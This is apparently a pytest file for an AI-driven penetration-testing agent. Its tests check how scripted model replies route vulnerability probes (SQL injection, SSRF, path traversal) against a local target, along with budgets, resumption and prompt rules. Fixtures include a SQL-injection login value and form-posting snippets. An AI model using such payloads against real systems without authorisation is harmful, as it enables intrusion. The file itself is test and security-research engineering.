from __future__ import annotations

import json
from typing import TYPE_CHECKING

import pytest
from ravage.agent_core.action_executor import ActionResult
from ravage.agent_core.agent_state import AgentState
from ravage.agent_core.frontier_auth_transition import (
    remember_auth_bypass_matrix_attempt,
)
from ravage.agent_core.frontier_closure_obligation import (
    closure_obligation_from_observation,
    closure_obligation_objective,
    remember_closure_obligation,
)
from ravage.agent_core.frontier_contract_memory import (
    ContractRouteContext,
    remember_observed_request_contracts,
)
from ravage.agent_core.frontier_contract_specialist import (
    contract_specialist_objective,
)
from ravage.agent_core.frontier_engine import (
    FrontierEngine,
    FrontierModelReply,
)
from ravage.agent_core.frontier_replay_contract import (
    authoritative_replay_for_family,
    rebase_frontier_objective,
    replay_contract_expected_clause,
)
from ravage.agent_core.frontier_route import (
    BaseRouteOutcome,
    BaseRouteTermination,
    FrontierObjective,
    FrontierObjectiveBasis,
    FrontierRoute,
    FrontierRouteConfig,
    FrontierRouteStatus,
    FrontierWorkerRole,
)
from ravage.run_data.workspace import AgentWorkspace

if TYPE_CHECKING:
    from collections.abc import Callable
    from pathlib import Path

TARGET_URL = "http://127.0.0.1:8765"
BASE_REQUESTS = 40
TWO_REQUESTS = 2
THREE_REQUESTS = 3
FOUR_REQUESTS = 4
FIVE_REQUESTS = 5
SIX_REQUESTS = 6
NINE_REQUESTS = 9
TEN_REQUESTS = 10


class ScriptedModel:
    def __init__(self, replies: list[FrontierModelReply | BaseException]) -> None:
        self.replies = list(replies)
        self.calls: list[list[dict[str, str]]] = []

    def __call__(self, messages: list[dict[str, str]]) -> FrontierModelReply:
        self.calls.append([dict(item) for item in messages])
        reply = self.replies.pop(0)
        if isinstance(reply, BaseException):
            raise reply
        return reply


class ScriptedExecutor:
    def __init__(self, results: list[ActionResult]) -> None:
        self.results = list(results)
        self.calls: list[dict[str, object]] = []

    def __call__(
        self,
        action: dict[str, object],
        *,
        repeat_count: int,
        action_id: str,
    ) -> ActionResult:
        self.calls.append(
            {
                "action": dict(action),
                "repeat_count": repeat_count,
                "action_id": action_id,
            }
        )
        return self.results.pop(0)


class RaisingExecutor:
    def __call__(
        self,
        _action: dict[str, object],
        *,
        repeat_count: int,
        action_id: str,
    ) -> ActionResult:
        del repeat_count, action_id
        message = "temporary tool transport failure"
        raise RuntimeError(message)


def _base() -> BaseRouteOutcome:
    return BaseRouteOutcome(
        target_url=TARGET_URL,
        termination=BaseRouteTermination.REQUEST_BUDGET_EXHAUSTED,
        model_requests=BASE_REQUESTS,
        state_digest="base-state-digest",
        state_ref="base/working_state.json",
    )


def _objective(
    family: str,
    probe: str,
    endpoint: str,
    *,
    basis: FrontierObjectiveBasis = FrontierObjectiveBasis.BASE_FRONTIER,
) -> FrontierObjective:
    return FrontierObjective.create(
        family=family,
        probe=probe,
        endpoint=endpoint,
        inputs=("input",),
        payload_class=f"specialist:{probe}",
        expected_signal=f"target-observed evidence for {family}",
        evidence_refs=("base-state:base-state-digest",),
        basis=basis,
    )


def _engine(  # noqa: PLR0913 - compact engine fixture.
    tmp_path: Path,
    *,
    model: ScriptedModel,
    executor: ScriptedExecutor,
    objectives: tuple[FrontierObjective, ...],
    config: FrontierRouteConfig | None = None,
    route: FrontierRoute | None = None,
    state: AgentState | None = None,
) -> FrontierEngine:
    active_route = route or FrontierRoute.start(
        base=_base(),
        initial_objective=objectives[0],
        scope=(TARGET_URL,),
        config=config or FrontierRouteConfig(),
    )
    return FrontierEngine(
        route=active_route,
        state=state or AgentState(turn=BASE_REQUESTS),
        objectives=objectives,
        workspace=AgentWorkspace.open(tmp_path / "frontier-workspace"),
        complete=model,
        execute=executor,
    )


def test_explicit_handoff_launches_a_new_worker_and_trusted_tool_proof_solves(
    tmp_path: Path,
) -> None:
    initial = _objective("path_traversal", "file_read_extract", "/download")
    alternative = _objective(
        "server_side_request_forgery",
        "ssrf_boundary",
        "/fetch",
    )
    proof = "flag{frontier-target-proof}"
    model = ScriptedModel(
        [
            FrontierModelReply(
                content=json.dumps(
                    {
                        "action": "final",
                        "summary": "return control",
                        "next_objective": {
                            "family": "made_up_ground_truth",
                            "endpoint": "http://example.com",
                        },
                    }
                ),
                cost_usd=0.01,
            ),
            FrontierModelReply(
                content=json.dumps(
                    {
                        "action": "run_probe",
                        "probe": "ssrf_boundary",
                        "expected_signal": "target-side fetch differential",
                    }
                ),
                cost_usd=0.02,
            ),
        ]
    )
    executor = ScriptedExecutor(
        [
            ActionResult(
                ok=True,
                observation=proof,
                stop=True,
                outcome="flag_candidate",
                flag=proof,
                evidence_source_kind="tool_run_probe",
                evidence_observation=proof,
            )
        ]
    )
    engine = _engine(
        tmp_path,
        model=model,
        executor=executor,
        objectives=(initial, alternative),
    )

    route = engine.run()

    assert route.status is FrontierRouteStatus.SOLVED
    assert route.model_requests_started == TWO_REQUESTS
    assert len(route.workers) == TWO_REQUESTS
    assert route.workers[1].role is FrontierWorkerRole.COUNTERFACTUAL
    assert len(executor.calls) == 1
    assert proof not in json.dumps(route.to_json())
    assert (engine.sessions.root / "worker-001.jsonl").exists()
    assert (engine.sessions.root / "worker-002.jsonl").exists()


def test_text_final_is_only_a_worker_handoff_not_a_success_result(tmp_path: Path) -> None:
    initial = _objective("exposure", "direct_exposure", "/")
    model = ScriptedModel([FrontierModelReply(content='{"action":"final","summary":"done"}')])
    engine = _engine(
        tmp_path,
        model=model,
        executor=ScriptedExecutor([]),
        objectives=(initial,),
    )

    route = engine.run()

    assert route.status is FrontierRouteStatus.FRONTIER_EXHAUSTED
    assert route.last_reason == "explicit_handoff_without_novel_objective"
    assert route.proof_digests == set()


def test_model_failure_leaves_a_durably_charged_pending_request(tmp_path: Path) -> None:
    initial = _objective("exposure", "direct_exposure", "/")
    model = ScriptedModel([RuntimeError("temporary provider failure")])
    engine = _engine(
        tmp_path,
        model=model,
        executor=ScriptedExecutor([]),
        objectives=(initial,),
    )

    with pytest.raises(RuntimeError, match="provider failure"):
        engine.run()

    restored = FrontierRoute.load(engine.route_state_path)
    assert restored.model_requests_started == 1
    assert restored.model_requests_completed == 0
    assert restored.pending_worker_id == "worker-001"


def test_resume_charges_interrupted_request_and_continues_without_replay(
    tmp_path: Path,
) -> None:
    initial = _objective("exposure", "direct_exposure", "/")
    first_model = ScriptedModel([RuntimeError("connection reset")])
    first = _engine(
        tmp_path,
        model=first_model,
        executor=ScriptedExecutor([]),
        objectives=(initial,),
    )
    with pytest.raises(RuntimeError):
        first.run()

    restored_route = FrontierRoute.load(first.route_state_path)
    second_model = ScriptedModel(
        [FrontierModelReply(content='{"action":"final","summary":"no route"}')]
    )
    second = _engine(
        tmp_path,
        model=second_model,
        executor=ScriptedExecutor([]),
        objectives=(initial,),
        route=restored_route,
    )

    route = second.run()

    assert route.model_requests_started == TWO_REQUESTS
    assert route.model_requests_completed == TWO_REQUESTS
    assert route.interrupted_model_requests == 1
    assert len(second_model.calls) == 1


def test_tool_error_is_model_visible_on_the_next_turn(tmp_path: Path) -> None:
    initial = _objective("command_injection", "command_boundary", "/run")
    model = ScriptedModel(
        [
            FrontierModelReply(content='{"action":"run_command","command":"missing-tool --check"}'),
            FrontierModelReply(content='{"action":"final","summary":"tool unavailable"}'),
        ]
    )
    executor = ScriptedExecutor(
        [
            ActionResult(
                ok=False,
                observation="missing-tool: command not found",
                outcome="blocked",
                evidence_source_kind="tool_run_command",
                evidence_observation="missing-tool: command not found",
            )
        ]
    )
    engine = _engine(
        tmp_path,
        model=model,
        executor=executor,
        objectives=(initial,),
    )

    engine.run()

    second_prompt = json.dumps(model.calls[1])
    assert "missing-tool: command not found" in second_prompt
    assert len(executor.calls) == 1


def test_raised_tool_failure_becomes_an_observation_and_does_not_abort_route(
    tmp_path: Path,
) -> None:
    initial = _objective("command_injection", "command_boundary", "/run")
    model = ScriptedModel(
        [
            FrontierModelReply(content='{"action":"run_command","command":"probe target"}'),
            FrontierModelReply(content='{"action":"final","summary":"handoff"}'),
        ]
    )
    engine = _engine(
        tmp_path,
        model=model,
        executor=RaisingExecutor(),
        objectives=(initial,),
    )

    route = engine.run()

    assert route.model_requests_started == TWO_REQUESTS
    assert "tool execution failed: RuntimeError" in json.dumps(model.calls[1])
    assert "cheapest discriminating action" in json.dumps(model.calls[0])
    assert "command-shaped host/domain/scheduler" in json.dumps(model.calls[0])


def test_frontier_prompt_requires_class_aware_paired_finding_replay(
    tmp_path: Path,
) -> None:
    state = AgentState()
    state.surface["flag_objective"] = False
    model = ScriptedModel([FrontierModelReply(content='{"action":"final","summary":"handoff"}')])
    engine = _engine(
        tmp_path,
        model=model,
        executor=ScriptedExecutor([]),
        objectives=(_objective("sql_injection", "query", "/search"),),
        state=state,
    )

    engine.run()

    prompt = json.loads(model.calls[0][-1]["content"])
    validate_poc = prompt["action_contract"]["validate_poc"]
    assert "capture_flag" not in prompt["action_contract"]
    assert [step["evidence_role"] for step in validate_poc["steps"]] == [
        "control",
        "exploit",
    ]
    rules = "\n".join(prompt["rules"])
    assert "same endpoint, method, headers, and input shape" in rules
    assert "server_side_template_injection/template_injection aliases" in rules
    assert "local_file_inclusion, arbitrary_file_read, and file_read aliases" in rules
    assert "new SQL error" in rules
    assert "Unsupported claims remain candidates" in rules
    assert "capture_flag" not in rules


def test_authenticated_frontier_prompt_exposes_only_managed_http_actions(
    tmp_path: Path,
) -> None:
    state = AgentState()
    state.surface["authenticated_identity"] = "analyst"
    model = ScriptedModel([FrontierModelReply(content='{"action":"final","summary":"handoff"}')])
    engine = _engine(
        tmp_path,
        model=model,
        executor=ScriptedExecutor([]),
        objectives=(_objective("authorization", "idor_boundary", "/account"),),
        state=state,
    )

    engine.run()

    prompt = json.loads(model.calls[0][-1]["content"])
    assert prompt["authentication"] == {
        "credential_transport": "managed_http_only",
        "identity": "analyst",
        "session_mode": "identity:analyst",
    }
    assert "run_probe" in prompt["action_contract"]
    assert "validate_poc" in prompt["action_contract"]
    assert "run_command" not in prompt["action_contract"]
    assert "run_python" not in prompt["action_contract"]
    rules = "\n".join(prompt["rules"])
    assert "command and Python actions are unavailable" in rules
    assert "Never supply, request, print, or infer authentication credentials" in rules
    assert "dom_execution" not in rules
    assert "HTTP validate_poc supports sql_injection" in rules
    assert "server_side_template_injection" in rules
    assert "path_traversal" in rules
    assert "Plain reflection cannot confirm XSS in managed authenticated mode" in rules
    assert {item["name"] for item in prompt["unavailable_authenticated_probes"]} == {
        "browser_boundary",
        "captcha_form_state",
        "cms_exposure",
        "dom_execution",
    }


def test_authenticated_frontier_legacy_unavailable_assignment_returns_control(
    tmp_path: Path,
) -> None:
    state = AgentState(surface={"authenticated_identity": "analyst"})
    model = ScriptedModel([FrontierModelReply(content='{"action":"final","summary":"handoff"}')])
    engine = _engine(
        tmp_path,
        model=model,
        executor=ScriptedExecutor([]),
        objectives=(_objective("browser", "browser_boundary", "/socket"),),
        state=state,
    )

    engine.run()

    prompt = json.loads(model.calls[0][-1]["content"])
    assert prompt["assignment"]["status"] == "unavailable_authenticated_transport"
    assert prompt["assigned_specialist"]["status"] == ("unavailable_authenticated_transport")
    assert prompt["objective_constraints"] == [
        "This persisted objective has no managed authenticated transport. Return final so the coordinator can choose an eligible frontier."
    ]


def test_engine_prompt_contains_no_benchmark_or_ground_truth_material(
    tmp_path: Path,
) -> None:
    initial = _objective("authentication", "default_credentials", "/login")
    model = ScriptedModel([FrontierModelReply(content='{"action":"final","summary":"handoff"}')])
    engine = _engine(
        tmp_path,
        model=model,
        executor=ScriptedExecutor([]),
        objectives=(initial,),
        state=AgentState(
            turn=BASE_REQUESTS,
            facts=["login form sets a session cookie after valid credentials"],
        ),
    )

    engine.run()
    encoded = json.dumps(model.calls).lower()

    assert "xben" not in encoded
    assert "benchmark" not in encoded
    assert "ground_truth" not in encoded
    assert "answer key" not in encoded


def test_confirmed_primitive_prompt_requires_a_materially_different_closure(
    tmp_path: Path,
) -> None:
    initial = FrontierObjective.create(
        family="template_injection",
        probe="ssti_fingerprint",
        endpoint="/register/final",
        inputs=("name",),
        payload_class="confirmed_primitive:ssti_confirmed:request_contract",
        expected_signal=(
            "Confirmed ssti_confirmed: preserve the accepted workflow. "
            "The default run_probe ssti_fingerprint route is exhausted; "
            "do not rerun it unchanged."
        ),
        evidence_refs=("primitive:ssti_confirmed:turn:5",),
    )
    model = ScriptedModel([FrontierModelReply(content='{"action":"final","summary":"handoff"}')])
    engine = _engine(
        tmp_path,
        model=model,
        executor=ScriptedExecutor([]),
        objectives=(initial,),
        config=FrontierRouteConfig(
            max_model_requests=1,
            scout_lease=1,
            counterfactual_lease=1,
            proof_lease=1,
            max_workers=1,
            repeated_observation_limit=2,
            repeated_low_value_route_limit=2,
        ),
    )

    engine.run()
    encoded = json.dumps(model.calls).lower()

    assert "do not call run_probe ssti_fingerprint unchanged" in encoded
    assert "do not restart broad discovery" in encoded
    assert "optional integer 1-120" in encoded
    assert "resume from the observed prefix" in encoded


def test_engine_executes_exactly_one_action_per_model_request(tmp_path: Path) -> None:
    initial = _objective("sql_injection", "sqli_differential", "/search")
    model = ScriptedModel(
        [
            FrontierModelReply(
                content=(
                    '{"action":"run_probe","probe":"sqli_differential"}'
                    '\n{"action":"run_command","command":"second action"}'
                )
            ),
            FrontierModelReply(content='{"action":"final","summary":"done"}'),
        ]
    )
    executor = ScriptedExecutor(
        [ActionResult(ok=True, observation="no differential", outcome="observed")]
    )
    engine = _engine(
        tmp_path,
        model=model,
        executor=executor,
        objectives=(initial,),
    )

    engine.run()

    assert len(executor.calls) == 1
    action = executor.calls[0]["action"]
    assert isinstance(action, dict)
    assert action["action"] == "run_probe"


def test_route_state_is_saved_before_each_model_call(tmp_path: Path) -> None:
    initial = _objective("exposure", "direct_exposure", "/")
    observed_pending: list[bool] = []
    engine_ref: list[FrontierEngine] = []

    def inspect_then_fail(_messages: list[dict[str, str]]) -> FrontierModelReply:
        route = FrontierRoute.load(engine_ref[0].route_state_path)
        observed_pending.append(route.pending_worker_id == "worker-001")
        message = "stop after persistence check"
        raise RuntimeError(message)

    engine = FrontierEngine(
        route=FrontierRoute.start(
            base=_base(),
            initial_objective=initial,
            scope=(TARGET_URL,),
        ),
        state=AgentState(turn=BASE_REQUESTS),
        objectives=(initial,),
        workspace=AgentWorkspace.open(tmp_path / "frontier-workspace"),
        complete=inspect_then_fail,
        execute=ScriptedExecutor([]),
    )
    engine_ref.append(engine)

    with pytest.raises(RuntimeError, match="persistence check"):
        engine.run()

    assert observed_pending == [True]


def test_engine_accepts_plain_callables_for_model_and_executor(tmp_path: Path) -> None:
    initial = _objective("exposure", "direct_exposure", "/")
    calls: list[str] = []

    def complete(_messages: list[dict[str, str]]) -> FrontierModelReply:
        calls.append("model")
        return FrontierModelReply(content='{"action":"final","summary":"done"}')

    def execute(*_args: object, **_kwargs: object) -> ActionResult:
        return ActionResult(ok=True, observation="unused")

    typed_execute: Callable[..., ActionResult] = execute
    engine = FrontierEngine(
        route=FrontierRoute.start(
            base=_base(),
            initial_objective=initial,
            scope=(TARGET_URL,),
        ),
        state=AgentState(turn=BASE_REQUESTS),
        objectives=(initial,),
        workspace=AgentWorkspace.open(tmp_path / "frontier-workspace"),
        complete=complete,
        execute=typed_execute,
    )

    engine.run()

    assert calls == ["model"]


def test_request_contract_guard_rejects_false_exhaustion_and_allows_closure(
    tmp_path: Path,
) -> None:
    initial = FrontierObjective.create(
        family="sql_injection",
        probe="sqli_exploit",
        endpoint="/index.php",
        inputs=("username",),
        payload_class="confirmed_primitive:sqli_confirmed:request_contract",
        expected_signal="preserve the target-observed login request contract",
        evidence_refs=("primitive:sqli_confirmed:turn:6",),
    )
    missing_submit = {
        "action": "run_python",
        "code": (
            "data=urllib.parse.urlencode({'username': username, "
            "'password': password}).encode(); "
            "urllib.request.Request(base+'index.php',data=data,method='POST')"
        ),
    }
    complete_contract = {
        "action": "run_python",
        "code": (
            "data=urllib.parse.urlencode({'username': username, "
            "'password': password, 'submit': 'submit'}).encode(); "
            "urllib.request.Request(base+'index.php',data=data,method='POST')"
        ),
    }
    proof = "flag{request-contract-closed}"
    ajax_contract = """
    $.ajax({
      type: 'post',
      url: 'index.php',
      data: {username: username, password: password, submit: 'submit'}
    });
    """
    model = ScriptedModel(
        [
            FrontierModelReply(content=json.dumps(missing_submit)),
            FrontierModelReply(content='{"action":"final","summary":"POST route exhausted"}'),
            FrontierModelReply(content=json.dumps(complete_contract)),
        ]
    )
    executor = ScriptedExecutor(
        [
            ActionResult(
                ok=True,
                observation=ajax_contract,
                outcome="same_as_before",
                evidence_source_kind="tool_run_python",
                evidence_observation=ajax_contract,
            ),
            ActionResult(
                ok=True,
                observation=proof,
                stop=True,
                outcome="flag_candidate",
                flag=proof,
                evidence_source_kind="tool_run_python",
                evidence_observation=proof,
            ),
        ]
    )
    engine = _engine(
        tmp_path,
        model=model,
        executor=executor,
        objectives=(initial,),
        config=FrontierRouteConfig(
            max_model_requests=4,
            scout_lease=4,
            counterfactual_lease=4,
            proof_lease=4,
            max_workers=4,
            repeated_observation_limit=4,
            repeated_low_value_route_limit=4,
        ),
    )

    route = engine.run()

    assert route.status is FrontierRouteStatus.SOLVED
    assert route.model_requests_started == THREE_REQUESTS
    assert len(executor.calls) == TWO_REQUESTS
    assert "submit" in json.dumps(model.calls[2])
    events = engine.workspace.events_path.read_text(encoding="utf-8")
    assert "frontier_request_contract_guarded" in events
    assert "frontier_request_contract_handoff_rejected" in events
    assert "frontier_request_contract_resolved" in events


def test_sql_request_contract_handoff_requires_target_observed_contract(
    tmp_path: Path,
) -> None:
    objective = FrontierObjective.create(
        family="sql_injection",
        probe="sqli_exploit",
        endpoint="/index.php",
        inputs=("username",),
        payload_class="confirmed_primitive:sqli_confirmed:request_contract",
        expected_signal="preserve the target-observed login request contract",
        evidence_refs=("primitive:sqli_confirmed:turn:6",),
    )
    inferred_post = {
        "action": "run_python",
        "code": (
            "data=urllib.parse.urlencode({'username': username, "
            "'password': password}).encode(); "
            "urllib.request.Request(base+'/index.php', data=data, method='POST')"
        ),
    }
    contract_discovery = {
        "action": "run_python",
        "code": (
            "html=urllib.request.urlopen(base+'/index.php').read(); "
            "print(html if b'username' in html else b'')"
        ),
    }
    ajax_contract = """
    $.ajax({
      type: 'post',
      url: 'index.php',
      data: {username: username, password: password, submit: 'submit'}
    });
    """
    wrapped_ajax_contract = json.dumps(
        {
            "command": ["docker", "run", "tool-image", "python3", "agent.py"],
            "exit_code": 0,
            "stdout": ajax_contract,
            "stderr": "",
        }
    )
    model = ScriptedModel(
        [
            FrontierModelReply(content=json.dumps(inferred_post), cost_usd=0.01),
            FrontierModelReply(
                content='{"action":"final","summary":"inferred POST exhausted"}',
                cost_usd=0.02,
            ),
            FrontierModelReply(content=json.dumps(contract_discovery), cost_usd=0.03),
            FrontierModelReply(
                content='{"action":"final","summary":"observed contract persisted"}',
                cost_usd=0.04,
            ),
        ]
    )
    executor = ScriptedExecutor(
        [
            ActionResult(
                ok=True,
                observation='{"response":"password"}',
                outcome="observed",
                evidence_source_kind="tool_run_python",
                evidence_observation='{"response":"password"}',
            ),
            ActionResult(
                ok=True,
                observation=wrapped_ajax_contract,
                outcome="observed",
                evidence_source_kind="tool_run_python",
                evidence_observation=wrapped_ajax_contract,
            ),
        ]
    )
    engine = _engine(
        tmp_path,
        model=model,
        executor=executor,
        objectives=(objective,),
        config=FrontierRouteConfig(
            max_model_requests=FOUR_REQUESTS,
            scout_lease=FOUR_REQUESTS,
            counterfactual_lease=FOUR_REQUESTS,
            proof_lease=FOUR_REQUESTS,
            max_workers=FOUR_REQUESTS,
            repeated_observation_limit=FOUR_REQUESTS,
            repeated_low_value_route_limit=FOUR_REQUESTS,
        ),
    )

    route = engine.run()

    assert route.status is FrontierRouteStatus.REQUEST_BUDGET_EXHAUSTED
    assert route.model_requests_started == FOUR_REQUESTS
    assert route.model_requests_completed == FOUR_REQUESTS
    assert route.spent_cost_usd == pytest.approx(0.1)
    assert len(executor.calls) == TWO_REQUESTS
    assert "persist a same-origin request contract" in json.dumps(model.calls[0]).lower()
    assert "COORDINATOR_OBSERVED_CONTRACT_GATE" in json.dumps(model.calls[2])

    replays = [json.loads(item) for item in engine.state.signals["sqli_replays"]]
    assert len(replays) == 1
    assert replays[0]["method"] == "POST"
    assert replays[0]["form"]["submit"] == "submit"
    events = engine.workspace.events_path.read_text(encoding="utf-8")
    assert events.count("frontier_observed_contract_handoff_rejected") == 1
    assert "frontier_request_contract_remembered" in events


def test_unstructured_code_classification_cannot_launch_a_proof_worker(
    tmp_path: Path,
) -> None:
    initial = _objective("sql_injection", "sqli_exploit", "/index.php")
    model = ScriptedModel(
        [
            FrontierModelReply(content='{"action":"run_command","command":"paired oracle"}'),
            FrontierModelReply(content='{"action":"final","summary":"SQLi confirmed"}'),
        ]
    )
    executor = ScriptedExecutor(
        [
            ActionResult(
                ok=True,
                observation="true branch differs from false branch",
                outcome="confirmed_signal",
                evidence_source_kind="tool_run_command",
                evidence_observation="true branch differs from false branch",
            ),
        ]
    )
    engine = _engine(
        tmp_path,
        model=model,
        executor=executor,
        objectives=(initial,),
        config=FrontierRouteConfig(
            max_model_requests=4,
            scout_lease=4,
            counterfactual_lease=4,
            proof_lease=4,
            max_workers=4,
            repeated_observation_limit=4,
            repeated_low_value_route_limit=4,
        ),
    )

    route = engine.run()

    assert route.status is FrontierRouteStatus.FRONTIER_EXHAUSTED
    assert route.model_requests_started == TWO_REQUESTS
    assert len(route.workers) == 1
    assert route.workers[0].role is FrontierWorkerRole.SCOUT
    assert len(executor.calls) == 1
    events = engine.workspace.events_path.read_text(encoding="utf-8")
    assert "frontier_proof_closure_handoff_rejected" not in events


def test_run23_target_contract_rebases_only_pending_sql_objectives(
    tmp_path: Path,
) -> None:
    state = AgentState(
        turn=BASE_REQUESTS,
        signals={
            "sqli_replays": [
                json.dumps(
                    {
                        "method": "GET",
                        "payload_field": "username",
                        "source": "replay",
                        "url": f"{TARGET_URL}/?username=admin%27--",
                    }
                )
            ]
        },
        primitives={"sqli_confirmed": 6},
    )
    contract = authoritative_replay_for_family(
        state,
        family="sql_injection",
        target_url=TARGET_URL,
    )
    assert contract is not None
    objectives = tuple(
        FrontierObjective.create(
            family="sql_injection",
            probe="sqli_exploit",
            endpoint=contract.endpoint,
            inputs=("username",),
            payload_class=f"confirmed_primitive:sqli_confirmed:{dimension}",
            expected_signal=(
                f"test the {dimension} dimension" + replay_contract_expected_clause(contract)
            ),
            evidence_refs=(contract.evidence_ref,),
        )
        for dimension in ("request_contract", "payload_semantics", "proof_channel")
    )
    contract_discovery = {
        "action": "run_python",
        "code": (
            f"url='{TARGET_URL}/?username=contract'\nhtml=requests.get(url).text\nprint(html)"
        ),
    }
    specialist_action = {"action": "run_probe", "probe": "sqli_exploit"}
    ajax_contract = """
    $.ajax({
      type: 'post',
      url: 'index.php',
      data: {username: username, password: password, submit: 'submit'},
      success: function(response) {
        if (response === 'Success') { location.href = 'dashboard.php'; }
      }
    });
    """
    wrapped_ajax_contract = json.dumps(
        {
            "command": ["docker", "run", "tool-image", "python3", "agent.py"],
            "exit_code": 0,
            "stdout": ajax_contract,
            "stderr": "",
        }
    )
    model = ScriptedModel(
        [
            FrontierModelReply(
                content=json.dumps(contract_discovery),
                cost_usd=0.01,
            ),
            FrontierModelReply(
                content='{"action":"final","summary":"target contract observed"}',
                cost_usd=0.02,
            ),
            FrontierModelReply(
                content=json.dumps(specialist_action),
                cost_usd=0.03,
            ),
        ]
    )
    executor = ScriptedExecutor(
        [
            ActionResult(
                ok=True,
                observation=wrapped_ajax_contract,
                outcome="observed",
                evidence_source_kind="tool_run_python",
                evidence_observation=wrapped_ajax_contract,
            ),
            ActionResult(
                ok=True,
                observation="specialist completed under the observed POST contract",
                outcome="observed",
                evidence_source_kind="tool_run_probe",
                evidence_observation=("specialist completed under the observed POST contract"),
            ),
        ]
    )
    engine = _engine(
        tmp_path,
        model=model,
        executor=executor,
        objectives=objectives,
        state=state,
        config=FrontierRouteConfig(
            max_model_requests=THREE_REQUESTS,
            scout_lease=THREE_REQUESTS,
            counterfactual_lease=THREE_REQUESTS,
            proof_lease=THREE_REQUESTS,
            max_workers=FOUR_REQUESTS,
            repeated_observation_limit=FOUR_REQUESTS,
            repeated_low_value_route_limit=FOUR_REQUESTS,
        ),
    )

    route = engine.run()

    assert route.status is FrontierRouteStatus.REQUEST_BUDGET_EXHAUSTED
    assert route.model_requests_started == THREE_REQUESTS
    assert route.model_requests_completed == THREE_REQUESTS
    assert route.spent_cost_usd == pytest.approx(0.06)
    assert len(executor.calls) == TWO_REQUESTS
    assert executor.calls[0]["action"] == contract_discovery
    assert executor.calls[1]["action"] == specialist_action
    assert len(route.workers) == TWO_REQUESTS
    assert route.workers[0].objective.payload_class.endswith("request_contract")
    assert route.workers[1].objective.payload_class.endswith("contract_specialist")
    assert route.workers[1].objective.endpoint == f"{TARGET_URL}/index.php"
    first_prompt = json.loads(model.calls[0][-1]["content"])
    candidate = first_prompt["coordinator_memory"]["replay_contract"]
    assert candidate["authority"] == "candidate"
    assert candidate["method"] == "GET"
    third_prompt = json.loads(model.calls[2][-1]["content"])
    assignment = third_prompt["assignment"]
    replay = third_prompt["coordinator_memory"]["replay_contract"]
    assert assignment["endpoint"] == f"{TARGET_URL}/index.php"
    assert assignment["inputs"] == ["username"]
    assert replay["authority"] == "target_observed"
    assert replay["method"] == "POST"
    assert replay["required_fields"] == ["password", "submit", "username"]
    assert replay["fixed_parameters"] == [{"name": "submit", "value": "submit"}]
    assert assignment["payload_class"].endswith("contract_specialist")
    assert any(
        "first executable action must be run_probe sqli_exploit" in item
        for item in third_prompt["objective_constraints"]
    )
    assert all(item.endpoint == f"{TARGET_URL}/index.php" for item in engine.objectives[1:])
    assert all("method=POST" in item.expected_signal for item in engine.objectives[1:])
    events = engine.workspace.events_path.read_text(encoding="utf-8")
    assert "frontier_pending_objectives_rebased" in events
    assert "frontier_contract_specialist_objective_queued" in events
    assert "frontier_authoritative_replay_rejected" not in events


def test_run25_partial_contract_requires_authority_then_one_specialist(
    tmp_path: Path,
) -> None:
    state = AgentState(
        turn=BASE_REQUESTS,
        signals={
            "sqli_replays": [
                json.dumps(
                    {
                        "method": "GET",
                        "payload_field": "username",
                        "source": "replay",
                        "url": f"{TARGET_URL}/?username=admin%27--",
                    }
                )
            ]
        },
        primitives={"sqli_confirmed": 6},
    )
    candidate = authoritative_replay_for_family(
        state,
        family="sql_injection",
        target_url=TARGET_URL,
    )
    assert candidate is not None
    objectives = tuple(
        FrontierObjective.create(
            family="sql_injection",
            probe="sqli_exploit",
            endpoint=candidate.endpoint,
            inputs=("username",),
            payload_class=f"confirmed_primitive:sqli_confirmed:{dimension}",
            expected_signal=(
                f"test the {dimension} dimension" + replay_contract_expected_clause(candidate)
            ),
            evidence_refs=(candidate.evidence_ref,),
        )
        for dimension in ("request_contract", "payload_semantics", "proof_channel")
    )
    partial_fetch = {
        "action": "run_python",
        "code": (
            "html=requests.get(base + '/index.php').text\n"
            "print(filtered_lines(html, ('username', 'password', 'success')))"
        ),
    }
    complete_fetch = {
        "action": "run_python",
        "code": (
            "html=requests.get(base + '/index.php').text\n"
            "print(complete_request_call(html, input_name='username'))"
        ),
    }
    specialist = {"action": "run_probe", "probe": "sqli_exploit"}
    manual_recreation = {
        "action": "run_python",
        "code": "print('manually recreate SQL controls')",
    }
    partial_output = """
      type: 'post',
      url: 'index.php',
      data: {
        username: username,
        password: password,
      success: handleResponse
      } else if (response === "password") {
    """
    complete_output = """
    $.ajax({
      type: 'post',
      url: 'index.php',
      data: {username: username, password: password, submit: 'submit'},
      success: handleResponse
    });
    """
    model = ScriptedModel(
        [
            FrontierModelReply(content=json.dumps(partial_fetch)),
            FrontierModelReply(content='{"action":"final","summary":"filtered contract found"}'),
            FrontierModelReply(content=json.dumps(complete_fetch)),
            FrontierModelReply(
                content='{"action":"final","summary":"complete contract persisted"}'
            ),
            FrontierModelReply(content='{"action":"final","summary":"skip specialist"}'),
            FrontierModelReply(content=json.dumps(manual_recreation)),
            FrontierModelReply(content=json.dumps(specialist)),
            FrontierModelReply(content=json.dumps(specialist)),
            FrontierModelReply(content='{"action":"final","summary":"specialist completed once"}'),
        ]
    )
    executor = ScriptedExecutor(
        [
            ActionResult(
                ok=True,
                observation=json.dumps(
                    {
                        "command": ["python3", "filtered-client-lines.py"],
                        "exit_code": 0,
                        "stdout": partial_output,
                    }
                ),
                outcome="observed",
                evidence_source_kind="tool_run_python",
                evidence_observation=json.dumps({"stdout": partial_output}),
            ),
            ActionResult(
                ok=True,
                observation=json.dumps(
                    {
                        "command": ["python3", "complete-client-request.py"],
                        "exit_code": 0,
                        "stdout": complete_output,
                    }
                ),
                outcome="observed",
                evidence_source_kind="tool_run_python",
                evidence_observation=json.dumps({"stdout": complete_output}),
            ),
            ActionResult(
                ok=True,
                observation="specialist completed without proof",
                outcome="observed",
                evidence_source_kind="tool_run_probe",
                evidence_observation="specialist completed without proof",
            ),
        ]
    )
    engine = _engine(
        tmp_path,
        model=model,
        executor=executor,
        objectives=objectives,
        state=state,
        config=FrontierRouteConfig(
            max_model_requests=NINE_REQUESTS,
            scout_lease=FOUR_REQUESTS,
            counterfactual_lease=FIVE_REQUESTS,
            proof_lease=FIVE_REQUESTS,
            max_workers=FOUR_REQUESTS,
            repeated_observation_limit=NINE_REQUESTS,
            repeated_low_value_route_limit=NINE_REQUESTS,
        ),
    )

    route = engine.run()

    assert route.status is FrontierRouteStatus.REQUEST_BUDGET_EXHAUSTED
    assert route.model_requests_started == NINE_REQUESTS
    assert len(route.workers) == TWO_REQUESTS
    assert route.workers[1].objective.payload_class.endswith("contract_specialist")
    assert [call["action"] for call in executor.calls] == [
        partial_fetch,
        complete_fetch,
        specialist,
    ]
